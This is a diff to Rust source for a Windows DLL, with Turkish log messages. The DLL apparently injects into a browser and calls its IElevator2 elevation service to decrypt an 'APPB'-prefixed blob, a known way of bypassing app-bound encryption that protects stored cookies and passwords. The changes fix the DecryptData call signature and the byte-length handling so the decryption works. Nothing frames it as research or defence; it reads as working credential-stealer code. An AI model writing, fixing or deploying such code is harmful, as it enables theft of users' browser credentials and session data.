@@ -16,7 +16,7 @@ use winapi::{
     um::{
         combaseapi::{CoCreateInstance, CoInitializeEx},
         objbase::COINIT_APARTMENTTHREADED,
-        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringLen},
+        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringLen, SysStringByteLen},
         winnt::DLL_PROCESS_ATTACH,
     },
     ctypes::c_void,
@@ -47,7 +47,7 @@ struct IElevatorVTbl {
     Release: unsafe extern "system" fn(*mut c_void) -> u32,
     RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
     EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
-    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
+    DecryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
 }
 
 fn log_message(msg: &str) -> Result<(), std::io::Error> {
@@ -86,11 +86,11 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
             &IID_IELEVATOR2,  // YENİ IID
             &mut elevator_ptr,
         );
-        
+
         if hr < 0 {
             let error_code = hr as u32;
             let _ = log_message(&format!("CoCreateInstance başarısız: 0x{:08X}", error_code));
-            
+
             // Hata kodunu anlamlı mesaja çevir
             let error_msg = match error_code {
                 0x80040154 => "CLSID not registered (0x80040154) - Elevation service bulunamadı",
@@ -99,7 +99,7 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
             };
             return Err(format!("CoCreateInstance başarısız: 0x{:08X} - {}", error_code, error_msg));
         }
-        
+
         let _ = log_message("IElevator2 instance'ı oluşturuldu.");
 
         let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
@@ -111,7 +111,7 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
         let mut last_error: u32 = 0;
 
         let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-        let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
+        let hr = ((*vtable).DecryptData)(elevator_ptr, 1, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
 
         SysFreeString(bstr_encrypted);
 
@@ -119,8 +119,7 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
             return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
         }
 
-        let char_count = SysStringLen(bstr_decrypted);
-        let byte_len = (char_count as usize) * 2;
+        let byte_len = SysStringByteLen(bstr_decrypted) as usize;
         let raw_bytes = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len);
         let decrypted = raw_bytes.to_vec();
 
@@ -161,8 +160,8 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     log_message(&format!("Base64 çözüldü, ham veri uzunluğu: {} byte", decoded.len()))?;
 
     let dpapi_blob = if decoded.len() >= 4 && &decoded[0..4] == b"APPB" {
-        log_message("APPB header'ı tespit edildi, kaldırılıyor...")?;
-        &decoded[4..]
+        log_message("APPB header'ı tespit edildi, korunuyor...")?;
+        &decoded[..]
     } else {
         log_message("APPB header'ı bulunamadı, tüm veri kullanılıyor...")?;
         &decoded
